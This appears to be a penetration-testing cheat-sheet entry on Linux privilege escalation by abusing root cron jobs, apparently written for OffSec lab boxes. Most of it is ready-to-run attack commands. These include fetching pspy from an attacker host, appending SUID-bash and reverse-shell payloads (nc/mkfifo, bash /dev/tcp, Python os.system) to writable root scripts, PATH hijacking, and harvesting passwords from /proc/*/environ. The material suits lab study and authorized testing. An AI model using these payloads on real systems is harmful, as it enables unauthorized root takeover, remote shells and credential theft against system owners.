title: Cron Job Exploitation
body: Module 18.3.1: find scripts run by root cron that you can write to. Append a reverse shell — within a minute you have root. Check /var/log/syslog for what's actually running.
cmd:
# ══════════════════════════════════════════════════
# PSPY — CONFIRM ROOT CRON BEFORE MODIFYING SCRIPT
# ══════════════════════════════════════════════════
# pspy lets you see what root is ACTUALLY running without needing root.
# Use it to confirm your inference, or find jobs linpeas missed.
#
# Transfer and run:
wget http://$LHOST/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64 && /tmp/pspy64
# Watch for 2-3 minutes. Cron fires every minute.
# Ctrl+C when you've seen enough.
#
# The line you're looking for:
# CMD: UID=0   PID=2434   | /bin/sh /opt/log-backup.sh
#       ^^^^^               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#   root (UID=0)            script path to target
#
# Real output from Flu box:
# 2023/12/13 09:52:01 CMD: UID=0 PID=2431 | /usr/sbin/CRON -f -P
# 2023/12/13 09:52:01 CMD: UID=0 PID=2434 | /bin/sh /opt/log-backup.sh
# → /opt/log-backup.sh owned by confluence → echo payload >> script → root
#
# Filter to root only:
/tmp/pspy64 | grep "UID=0"
#
# Once confirmed — OVERWRITE or APPEND:
# Overwrite (cleaner, Flu walkthrough method):
echo 'chmod u+s /bin/bash' > /opt/log-backup.sh
# Append (safer, preserves original — use >>):
echo 'chmod u+s /bin/bash' >> /opt/log-backup.sh
# Wait up to 60 seconds, then:
ls -la /bin/bash   # watch for: -rwsr-xr-x (s bit set)
/bin/bash -p
id   # euid=0(root)

# ══════════════════════════════════════════════════
# INFERRING ROOT CRON WITHOUT READING /var/spool/cron/crontabs/root
# (that file is root-only — you can't read it directly)
# ══════════════════════════════════════════════════
# Dead giveaway: a script YOU OWN that operates on root-only paths
# Root-only paths: /root/, /etc/shadow, /etc/sudoers, /var/shadow
# A low-priv user can't write there directly.
# If a script you own does it → root must be executing it → you control what root runs.
#
# From Flu box (Confluence CVE-2022-26134):
#   /opt/log-backup.sh owned by confluence → copies to /root/backup
#   confluence can't write /root/ → root runs the script → append = root exec
#
# Checklist when you find a suspicious script:
#   1. ls -la /path/to/script.sh     → do YOU own it?
#   2. cat /path/to/script.sh        → does it touch /root/, /etc/shadow, etc.?
#   3. If yes to both → append payload, wait 60s, check for SUID bash
#
# Also check: linpeas "Executable files potentially added by user" section
# and "Interesting writable files" — scripts in /opt/ with custom timestamps
# are almost always cron targets on lab boxes.

# ── ENV VARS — database passwords often reuse root password ──────
# Check app service env before anything else:
cat /proc/$(pgrep -f confluence 2>/dev/null | head -1)/environ 2>/dev/null | tr '\0' '\n' | grep -i password
cat /proc/$(pgrep -f tomcat 2>/dev/null | head -1)/environ 2>/dev/null | tr '\0' '\n' | grep -i password
# Or grep all processes at once:
grep -a 'password' /proc/*/environ 2>/dev/null | strings | grep -i password
# Found synchrony.database.password=HoldingOn12 → try: su root → HoldingOn12
# This works more often than it should on lab boxes.

# ── FIND CRON JOBS ────────────────────────────────────
cat /etc/crontab
ls -la /etc/cron*
cat /etc/cron.d/*
crontab -l
sudo crontab -l   # root jobs if sudo allows

# ── CHECK SYSLOG FOR RUNNING CRON JOBS ───────────────
# Most reliable way to see what actually runs and when
grep "CRON" /var/log/syslog
grep "CRON" /var/log/syslog | tail -20
# Look for: (root) CMD (/path/to/script.sh)

# ── PSPY — WATCH WITHOUT ROOT ────────────────────────
# Download: github.com/DominicBreuker/pspy
wget http://$LHOST/pspy64 -O /tmp/pspy64   # 64-bit
wget http://$LHOST/pspy32 -O /tmp/pspy32   # 32-bit (match arch)
chmod +x /tmp/pspy64 && /tmp/pspy64

# Reading output — look for UID=0:
# CMD: UID=0 PID=121 | /bin/sh -c /var/archives/archive.sh
# CMD: UID=0 PID=122 | /bin/bash /var/archives/archive.sh
#   → root running archive.sh every minute
#   → ls -la /var/archives/archive.sh
#   → if world-writable: echo "chmod u+s /bin/bash" >> /var/archives/archive.sh
#   → wait 1 min → /bin/bash -p → root

# Filter to just root processes:
/tmp/pspy64 | grep "UID=0"

# Also watch for:
# Creds in args: sshpass -p, mysql -p, curl -u
# Scripts without full path = PATH hijack
# Temp files in /tmp = race condition

# ── CHECK SCRIPT PERMISSIONS ──────────────────────────
# Once you find a script run by root:
ls -la /home/joe/.scripts/user_backups.sh
# -rwxrwxrw- = world writable = exploitable
cat /home/joe/.scripts/user_backups.sh

# ── EXPLOIT — APPEND REVERSE SHELL ───────────────────
# Method 1: SUID bash (cleanest — no listener needed)
# Lab validated: OffSec capstone
echo "chmod u+s /bin/bash" >> /path/to/script.sh
# Wait up to 1 minute for cron to fire
ls -la /bin/bash   # watch for s bit: -rwsr-xr-x
/bin/bash -p       # -p preserves effective UID = root shell
# bash-5.1# whoami → root

# Method 2: reverse shell
echo "" >> /path/to/script.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST 443 >/tmp/f" >> /path/to/script.sh

# Method 3: copy bash with SUID
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /path/to/script.sh
# Wait then: /tmp/rootbash -p

# ── LISTENER ON KALI ─────────────────────────────────
nc -nlvp 443
# Wait up to 1 minute for cron to fire

# ── PATH INJECTION IN CRON ────────────────────────────
# If crontab has PATH= and calls script without full path:
# PATH=/home/joe:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# * * * * * cleanup.sh
# Create malicious cleanup.sh in /home/joe:
echo '#!/bin/bash
bash -i >& /dev/tcp/$LHOST/443 0>&1' > /home/joe/cleanup.sh
chmod +x /home/joe/cleanup.sh

# ══════════════════════════════════════════════════
# CRON JOB ABUSE — writable script or binary
# ══════════════════════════════════════════════════
# pspy catches root running something on a timer without needing root yourself:
./pspy64    # watch for UID=0 CMD lines — those are root's cron/service calls

# Once you spot a root-executed path, check if YOU can write it:
ls -la /path/to/script_or_binary
find / -writable -name "*.sh" -o -writable -name "*.py" 2>/dev/null | grep -v proc

# If writable — match the payload to how root invokes it:
#   root runs: python2.7 /opt/service/app.py  → payload must be valid Python
#   root runs: /opt/service/script.sh         → payload can be bash
#   root runs: /opt/service/binary (directly) → overwrite with your binary

# Python payload (when root calls python <file>):
echo 'import os; os.system("bash -c \'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\'")' > /path/to/script.py

# Bash payload (when root calls script directly as executable):
echo '#!/bin/bash' > /path/to/script.sh
echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /path/to/script.sh
chmod +x /path/to/script.sh

# BACKUP FIRST if overwriting a binary others depend on:
cp /path/to/binary /tmp/binary.bak

# RESTORE after you catch the shell — broken cron loops cause instability:
cp /tmp/binary.bak /path/to/binary
warn: Always use >> to APPEND to the cron script, never > which overwrites it. KEY INFERENCE: if a script you own writes to /root/ or /etc/shadow, root is running it — you don't need to read root's crontab to know. Also check process env variables (grep -a password /proc/*/environ) immediately after getting a shell — app DB passwords frequently ARE the root password.

choices.label: Script not writable — try PATH injection
Writable systemd unit instead of cron
Can only sudo reboot — trigger it at boot
